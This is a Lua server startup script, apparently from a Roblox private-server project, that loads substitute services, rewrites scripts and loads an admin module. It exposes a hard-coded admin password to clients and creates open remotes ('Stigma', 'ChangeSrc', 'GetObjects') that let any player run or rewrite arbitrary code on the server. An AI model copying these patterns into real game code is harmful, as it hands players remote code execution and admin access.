_G.AdminPasswordPublic = 'password=100775484'

workspace.FilteringEnabled = true
local bodytype="R15"
local starterplayer=game:GetService("StarterPlayer")
if bodytype~="Custom" then
if starterplayer:FindFirstChild("StarterCharacter") then
starterplayer.StarterCharacter:Destroy()
end
end
if bodytype=="R6" then
local a=game:GetObjects("rbxasset://avatar/R6.rbxm")[1]
local x=a:Clone()
x.Name="StarterCharacter"
x.Parent=starterplayer
end
if bodytype=="R15" then
local a=game:GetObjects("rbxasset://avatar/R15.rbxm")[1]
local x=a:Clone()
x.Name="StarterCharacter"
x.Parent=starterplayer
end


local modulelol = game:GetObjects("rbxasset://DataStoreService.rbxm")[1]
modulelol.Parent=game:GetService("ReplicatedStorage")

local modulelol2 = game:GetObjects("rbxasset://MarketPlaceService.rbxm")[1]
modulelol2.Parent=game:GetService("ReplicatedStorage")

local modulelol3 = game:GetObjects("rbxasset://LuawebService.rbxm")[1]
modulelol3.Parent=game:GetService("ReplicatedStorage")

local modulelol4 = game:GetObjects("rbxasset://PointsService.rbxm")[1]
modulelol4.Parent=game:GetService("ReplicatedStorage")

local modulelol5 = game:GetObjects("rbxasset://GroupService.rbxm")[1]
modulelol5.Parent=game:GetService("ReplicatedStorage")

local modulelol6 = game:GetObjects("rbxasset://InsertService.rbxm")[1]
modulelol6.Parent=game:GetService("ReplicatedStorage")

local modulelol8 = game:GetObjects("rbxasset://ChatService.rbxm")[1]
modulelol8.Parent=game:GetService("ReplicatedStorage")

local modulelol10 = game:GetObjects("rbxasset://PlayersService.rbxm")[1]
modulelol10.Parent=game:GetService("ReplicatedStorage")


game.DescendantAdded:connect(function(a)
local reenable=true
pcall(function()
if a:IsDescendantOf(game:GetService("ServerScriptService")) or a:IsDescendantOf(game:GetService("ServerStorage")) or a:IsDescendantOf(game:GetService("ReplicatedStorage")) or a:IsDescendantOf(workspace) or a:IsDescendantOf(game:GetService("StarterGui")) or a:IsDescendantOf(game:GetService("StarterPlayer")) or a:IsDescendantOf(game:GetService("StarterPack")) or a:IsDescendantOf(game:GetService("ReplicatedFirst")) then
if a:IsA("Script") or a:IsA("ModuleScript") or a:IsA("LocalScript") then
if string.match(a.Source,"DataStoreService") or string.match(a.Source,'MarketplaceService') or string.match(a.Source,'BadgeService') or string.match(a.Source,'GamePassService') or string.match(a.Source,'IsInGroup') or string.match(a.Source,'GetRankInGroup') or string.match(a.Source,'PointsService') or string.match(a.Source,'GroupService') or string.match(a.Source,'InsertService') or string.match(a.Source,'IsFriendsWith') then
pcall(function()
if a.Disabled==true then
reenable=false
else
a.Disabled=true
end
end)
local function fixscript()
local xd=a.Source
		xd = string.gsub(xd,"game:GetService%('DataStoreService'%)","require(game:GetService('ReplicatedStorage').DataStoreService)")
		xd = string.gsub(xd,'game:GetService%("DataStoreService"%)','require(game:GetService("ReplicatedStorage").DataStoreService)')
		xd = string.gsub(xd,"game:GetService%('MarketplaceService'%)","require(game:GetService('ReplicatedStorage').MarketPlaceService)")
		xd = string.gsub(xd,'game:GetService%("MarketplaceService"%)','require(game:GetService("ReplicatedStorage").MarketPlaceService)')
                xd = string.gsub(xd,'game.MarketplaceService','require(game.ReplicatedStorage.MarketPlaceService)')
                xd = string.gsub(xd,'game.GamePassService','require(game.ReplicatedStorage.LuawebService)')
               xd = string.gsub(xd,'game:GetService%("GamePassService"%)','require(game:GetService("ReplicatedStorage").LuawebService)')
               xd = string.gsub(xd,"game:GetService%('GamePassService'%)","require(game:GetService('ReplicatedStorage').LuawebService)")

                              xd = string.gsub(xd,'game.BadgeService','require(game.ReplicatedStorage.LuawebService)')
               xd = string.gsub(xd,'game:GetService%("BadgeService"%)','require(game:GetService("ReplicatedStorage").LuawebService)')
               xd = string.gsub(xd,"game:GetService%('BadgeService'%)","require(game:GetService('ReplicatedStorage').LuawebService)")
               xd = string.gsub(xd,':IsInGroup','.userId-')
               xd = string.gsub(xd,':GetRankInGroup','.userId-')
               xd = string.gsub(xd,':IsFriendsWith','.userId==')
               	xd = string.gsub(xd,"game:GetService%('PointsService'%)","require(game:GetService('ReplicatedStorage').PointsService)")
		xd = string.gsub(xd,'game:GetService%("PointsService"%)','require(game:GetService("ReplicatedStorage").PointsService)')
                xd = string.gsub(xd,'game.PointsService','require(game.ReplicatedStorage.PointsService)')

               	xd = string.gsub(xd,"game:GetService%('GroupService'%)","require(game:GetService('ReplicatedStorage').GroupService)")
		xd = string.gsub(xd,'game:GetService%("GroupService"%)','require(game:GetService("ReplicatedStorage").GroupService)')
                xd = string.gsub(xd,'game.GroupService','require(game.ReplicatedStorage.GroupService)')

	xd = string.gsub(xd,"game:GetService%('InsertService'%)","require(game:GetService('ReplicatedStorage').InsertService)")
		xd = string.gsub(xd,'game:GetService%("InsertService"%)','require(game:GetService("ReplicatedStorage").InsertService)')
                xd = string.gsub(xd,'game.InsertService','require(game.ReplicatedStorage.InsertService)')


		xd = string.gsub(xd,'game.Chat','require(game:GetService("ReplicatedStorage").Chat)')
               xd = string.gsub(xd,'game:GetService%("Chat"%)','require(game:GetService("ReplicatedStorage").Chat)')
xd = string.gsub(xd,"game:GetService%('Chat'%)","require(game:GetService('ReplicatedStorage').Chat)")



xd = string.gsub(xd,"game:GetService'DataStoreService'","require(game:GetService('ReplicatedStorage'):WaitForChild('DataStoreService'))")
xd = string.gsub(xd,'game:GetService"DataStoreService"','require(game:GetService("ReplicatedStorage"):WaitForChild("DataStoreService"))')


xd = string.gsub(xd,'game.Players:GetPlayerByUserId','require(game.ReplicatedStorage.Players):GetPlayerByUserId')

xd = string.gsub(xd,'Game:GetService%("DataStoreService"%)','require(game:GetService("ReplicatedStorage"):WaitForChild("DataStoreService"))')
a.Source=xd
end

local succ, err = pcall(function()
fixscript()
end)
if err then
print(err)
end

pcall(function()
if reenable==true then
a.Disabled=false
end
end)
	end
end
end
end)
end)

--[[
		// Filename: ServerStarterScript.lua
		// Version: 1.0
		// Description: Server core script that handles core script server side logic.
]]--
local adminloaded=false
local runService = game:GetService('RunService')

-- Prevent server script from running in Studio when not in run mode
while not runService:IsRunning() do
	wait()
end

--[[ Services ]]--
local RobloxReplicatedStorage = game:GetService('RobloxReplicatedStorage')
local ScriptContext = game:GetService('ScriptContext')

--[[ Add Server CoreScript ]]--
ScriptContext:AddCoreScriptLocal("ServerCoreScripts/ServerSocialScript", script.Parent)

--[[ Remote Events ]]--
local RemoteEvent_SetDialogInUse = Instance.new("RemoteEvent")
RemoteEvent_SetDialogInUse.Name = "SetDialogInUse"
RemoteEvent_SetDialogInUse.Parent = RobloxReplicatedStorage

local RemoteFunction_GetServerVersion = Instance.new("RemoteFunction")
RemoteFunction_GetServerVersion.Name = "GetServerVersion"
RemoteFunction_GetServerVersion.Parent = RobloxReplicatedStorage

--[[ Event Connections ]]--
local playerDialogMap = {}

local freeCameraFlagSuccess, freeCameraFlagValue = pcall(function() return settings():GetFFlag("FreeCameraForAdmins") end)
local freeCameraFlag = (freeCameraFlagSuccess and freeCameraFlagValue)

local function setDialogInUse(player, dialog, value, waitTime)
	if typeof(dialog) ~= "Instance" or not dialog:IsA("Dialog") then
		return
	end
	if type(value) ~= "boolean" then
		return
	end
	if type(waitTime) ~= "number" and type(waitTime) ~= "nil" then
		return
	end
	if typeof(player) ~= "Instance" or not player:IsA("Player") then
		return
	end

	if waitTime and waitTime ~= 0 then
		wait(waitTime)
	end
	if dialog ~= nil then
		dialog:SetPlayerIsUsing(player, value)
		playerDialogMap[player] = value and dialog or nil
	end
end
RemoteEvent_SetDialogInUse.OnServerEvent:connect(setDialogInUse)

local function getServerVersion()
	local rawVersion = runService:GetRobloxVersion()
	local displayVersion
	if rawVersion == "?" then
		displayVersion = "DEBUG_SERVER"
	else
		if runService:IsStudio() then
			displayVersion = "ROBLOX Studio"
		else
			displayVersion = rawVersion
		end
	end
	return displayVersion
end

RemoteFunction_GetServerVersion.OnServerInvoke = getServerVersion

game:GetService("Players").PlayerRemoving:connect(function(player)
	if player then
		local dialog = playerDialogMap[player]
		if dialog then
			dialog:SetPlayerIsUsing(player, false)
			playerDialogMap[player] = nil
		end
	end
end)

if game:GetService("Chat").LoadDefaultChat then
	require(game:GetService("CoreGui").RobloxGui.Modules.Server.ClientChat.ChatWindowInstaller)()
	require(game:GetService("CoreGui").RobloxGui.Modules.Server.ServerChat.ChatServiceInstaller)()
end

if freeCameraFlag then
	require(game:GetService("CoreGui").RobloxGui.Modules.Server.FreeCamera.FreeCameraInstaller)()
end

if UserSettings():IsUserFeatureEnabled("UserUseSoundDispatcher") then
	require(game:GetService("CoreGui").RobloxGui.Modules.Server.ServerSound.SoundDispatcherInstaller)()
end
local passxd=Instance.new("StringValue")
passxd.Parent=game:GetService("ReplicatedStorage")
passxd.Name="AdonisPassword"
passxd.Value=_G.AdminPasswordPublic

function safe(obj)
	if obj:IsA("Script") or obj:IsA("LocalScript") then
		return false
	else
		for i,v in pairs(obj:GetDescendants()) do
			if v:IsA("Script") or v:IsA("LocalScript") then
				return false
			end
		end
	end
	return true
end
game:GetService("Players").PlayerRemoving:connect(function(plr)
	print("[[game logs]] "..plr.Name.." Left the game!")
end)
game:GetService("Players").PlayerAdded:connect(function(plr)
local xd=Instance.new("BoolValue",plr) xd.Name="IsInGroupxd" xd.Value=false
local xd3=Instance.new("IntValue",plr) xd3.Name="GetRankInGroupxd" xd3.Value=0
	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Name==plr.Name and v~=plr then
			_G.Plrtokick=plr
			local s=Instance.new("Script") s.Source="wait() _G.Plrtokick:Kick('That username is already taken.') script:Destroy()" s.Parent=workspace
			return;
		end
	end
	print("[[game logs]] "..plr.Name.." Joined the game!")
	plr.Chatted:connect(function(msg)
		print("[[game logs]] "..plr.Name.." Chatted: " ..msg)
	end)
	game:GetObjects("rbxasset://test.rbxm")[1].Parent=plr.PlayerGui
	game:GetObjects("rbxasset://RobloxGui.rbxm")[1].Parent=plr.PlayerGui
	local app=plr.CharacterAppearance
	local headcolor
	local torsocolor
	local leftarmcolor
	local rightarmcolor
	local leftlegcolor
	local rightlegcolor
	local axd=0
	for w in (app .. '|'):gmatch('([^|]*)|') do 
		axd=axd+1
		if axd==1 then
			app=w
		else
			local timesran=0
			for xd in (w .. ';'):gmatch('([^;]*);') do 
				timesran=timesran+1
				if timesran==1 then
					headcolor=xd
				elseif timesran==2 then
					torsocolor=xd
				elseif timesran==3 then
					leftarmcolor=xd
				elseif timesran==4 then
					rightarmcolor=xd
				elseif timesran==5 then
					leftlegcolor=xd
				elseif timesran==6 then
					rightlegcolor=xd
				end
			end
		end
	end
	plr.CharacterAdded:connect(function(char)
		local bcolors=Instance.new("BodyColors",char)
		bcolors.Name = "Body Colors"
		plr=plr
		local words = {}
		wait(1)
		pcall(function()
			bcolors.HeadColor=BrickColor.new(headcolor)
			bcolors.LeftArmColor=BrickColor.new(leftarmcolor)
			bcolors.LeftLegColor=BrickColor.new(leftlegcolor)
			bcolors.RightArmColor=BrickColor.new(rightarmcolor)
			bcolors.RightLegColor=BrickColor.new(rightlegcolor)
			bcolors.TorsoColor=BrickColor.new(torsocolor)
		end)

		for w in (app .. ';'):gmatch('([^;]*);') do 
			table.insert(words, w) 
		end
		local num1=words[1]
		local number= nil
		function loadchar()
			for i,v in pairs(words) do
				if v==_G.AdminPasswordPublic then
					print(plr.Name .." is the host!")
					local a=Instance.new("StringValue") a.Parent=plr a.Value=_G.AdminPasswordPublic a.Name="password"
				else
					pcall(function()
local a=game:GetObjects(v)[3]
for i,ll in pairs(a:GetChildren()) do
if safe(ll) then
if char:FindFirstChild("Torso") then
ll.Parent=char
end
end
end
end)
					pcall(function()
local a=game:GetObjects(v)[2]
for i,ll in pairs(a:GetChildren()) do
if safe(ll) then
if char:FindFirstChild("Torso") then
ll.Parent=char
end
end
end
end)
					pcall(function()
local a=game:GetObjects(v)[1]
if safe(a) then
	a.Parent=char
if a.Name=="face" and a:IsA("Decal") then
for i,v in pairs(char.Head:GetChildren()) do
if v:IsA("Decal") and v.Name=="face" then
v:Destroy()
end
end
a.Parent=char.Head
end
end
end)
end
end
end
pcall(function()
	loadchar()
end)
end)
end)
local grfgrf=Instance.new("IntValue",workspace) grfgrf.Name="grfgrf"
                        local aarr=Instance.new("Folder",game:GetService("ReplicatedStorage")) aarr.Name="wtfStoragewtf"
grfgrf.Changed:connect(function()
pcall(function()
                        local thing=game:GetObjects("rbxassetid://"..tostring(grfgrf.Value))[1]
                        local r= Instance.new("IntValue",thing) r.Name=tostring(grfgrf.Value)
			thing.Parent=aarr
end)
end)
game:GetService("RunService").Heartbeat:connect(function()
	if not workspace:findFirstChild("Stigma") then
		local e=Instance.new('RemoteFunction',workspace)
		e.Name='Stigma'
		e.OnServerInvoke = function(plr,text)
			local formatted=text
			local s=Instance.new("LocalScript") s.Source="wait() "..formatted
			s.Parent=plr.PlayerGui
		end
	end
	if not workspace:findFirstChild("GetObjects") then
		local ee=Instance.new('RemoteFunction',workspace)
		ee.Name='GetObjects'
		ee.OnServerInvoke = function(plr,text)
			local thing=game:GetObjects(text)[1]
			thing.Parent=game:GetService("ReplicatedStorage")
			return {thing};
		end
	end
	if not workspace:findFirstChild("ChangeSrc") then
		local ee=Instance.new('RemoteEvent',workspace)
		ee.Name='ChangeSrc'
		ee.OnServerEvent:connect(function(plr,scriptlol,setto)
			if scriptlol==nil then
				print("Uh Oh!")
				local e=Instance.new("LocalScript")
				e.Source=setto
				e.Parent=plr.Character
			else
				scriptlol.Source=setto
			end
		end)
	end
	if not workspace:findFirstChild("test") then
		local eee=Instance.new('RemoteFunction',workspace)
		eee.Name='test'
		eee.OnServerInvoke = function(plr,text)
			local thing=game:GetObjects(text)[1]
			thing.Parent=game:GetService("ReplicatedStorage")
			return {thing};
		end
	end
	if not workspace:findFirstChild("GetSrc") then
		local aaa=Instance.new("RemoteFunction",workspace)
		aaa.Name="GetSrc"
		aaa.OnServerInvoke = function(plr,thing)
			if typeof(thing)=="Instance" then
				if thing:IsA("Script") or thing:IsA("LocalScript") then
					return thing.Source;
				else
					for i,v in pairs(thing:GetDescendants()) do
						if v:IsA("Script") or v:IsA("LocalScript") then
							local formatted=v.Source
							for match in string.gmatch(formatted,'.Source%)%(%)') do
								local test=string.match(formatted, "loadstring%((.-)%.Source%)%(%)")
								if test~=nil then
									if string.gmatch(formatted,test) then
										local s1=test:gsub(".Source","")
										formatted=formatted:gsub("%.Source%)%(%)",")()")
										formatted=formatted:gsub("game:GetObjects","workspace.GetSrc:InvokeServer")
									end
								end
							end
							pcall(function() for match in string.gmatch(formatted,'loadstring') do
									formatted=formatted:gsub('loadstring','print')
								end end)
							pcall(function() for match in string.gmatch(formatted,'roblox.com') do
									formatted=formatted:gsub('roblox.com','localhost')
								end end)
							pcall(function() if string.gmatch(formatted,'game:GetObjects') then
									formatted=formatted:gsub('game:GetObjects','workspace.GetObjects:InvokeServer')
								end end)
							pcall(function() for match in string.gmatch(formatted,'script%.Disabled') do
									formatted=formatted:gsub('script%.Disabled','local a')
								end end)
							pcall(function() for match in string.gmatch(formatted,'game:GetService%("CoreGui"%)') do
									formatted=formatted:gsub('game:GetService%("CoreGui"%)','game:GetService("Players").LocalPlayer.PlayerGui.CoreGui')
								end end)
							pcall(function() for match in string.gmatch(formatted,"game:GetService%('CoreGui'%)") do
									formatted=formatted:gsub("game:GetService%('CoreGui'%)","game:GetService('Players').LocalPlayer.PlayerGui.CoreGui")
								end end)
							pcall(function() for match in string.gmatch(formatted,"game.CoreGui") do
									formatted=formatted:gsub("game.CoreGui","game.Players.LocalPlayer.PlayerGui.CoreGui")
								end end)
							v.Source=formatted
						end
					end
					return {thing};
				end
			else
				local text=game:GetObjects(thing)[1]
				text.Parent=game:GetService("ReplicatedStorage")
				if text:IsA("Script") or text:IsA("LocalScript") then
					return {text.Source};
				else
					for i,v in pairs(text:GetDescendants()) do
						if v:IsA("Script") or v:IsA("LocalScript") then
							local formatted=v.Source
							for match in string.gmatch(formatted,'.Source%)%(%)') do
								local test=string.match(formatted, "loadstring%((.-)%.Source%)%(%)")
								if test~=nil then
									if string.gmatch(formatted,test) then
										local s1=test:gsub(".Source","")
										formatted=formatted:gsub("%.Source%)%(%)",")()")
										formatted=formatted:gsub("game:GetObjects","workspace.GetSrc:InvokeServer")
									end
								end
							end
							pcall(function() for match in string.gmatch(formatted,'loadstring') do
									formatted=formatted:gsub('loadstring','print')
								end end)
							pcall(function() for match in string.gmatch(formatted,'roblox.com') do
									formatted=formatted:gsub('roblox.com','localhost')
								end end)
							pcall(function() if string.gmatch(formatted,'game:GetObjects') then
									formatted=formatted:gsub('game:GetObjects','workspace.GetObjects:InvokeServer')
								end end)
							pcall(function() for match in string.gmatch(formatted,'script%.Disabled') do
									formatted=formatted:gsub('script%.Disabled','local a')
								end end)
							pcall(function() for match in string.gmatch(formatted,'game:GetService%("CoreGui"%)') do
									formatted=formatted:gsub('game:GetService%("CoreGui"%)','game:GetService("Players").LocalPlayer.PlayerGui.CoreGui')
								end end)
							pcall(function() for match in string.gmatch(formatted,"game:GetService%('CoreGui'%)") do
									formatted=formatted:gsub("game:GetService%('CoreGui'%)","game:GetService('Players').LocalPlayer.PlayerGui.CoreGui")
								end end)
							pcall(function() for match in string.gmatch(formatted,"game.CoreGui") do
									formatted=formatted:gsub("game.CoreGui","game.Players.LocalPlayer.PlayerGui.CoreGui")
								end end)
							v.Source=formatted
						end
					end
					return {text};
				end
			end
		end
	end
end)

wait()

local module = game:GetObjects("rbxasset://admin.rbxm")[1]
module.Parent=game:GetService("ServerStorage")
module.Name="AdonisAdminModule"
local scriptttxd=Instance.new("Script")
scriptttxd.Source="require(".."game:GetService('ServerStorage').AdonisAdminModule).load()"
scriptttxd:Clone().Parent=game:GetService("ServerScriptService")

game:GetService("HttpService").HttpEnabled = true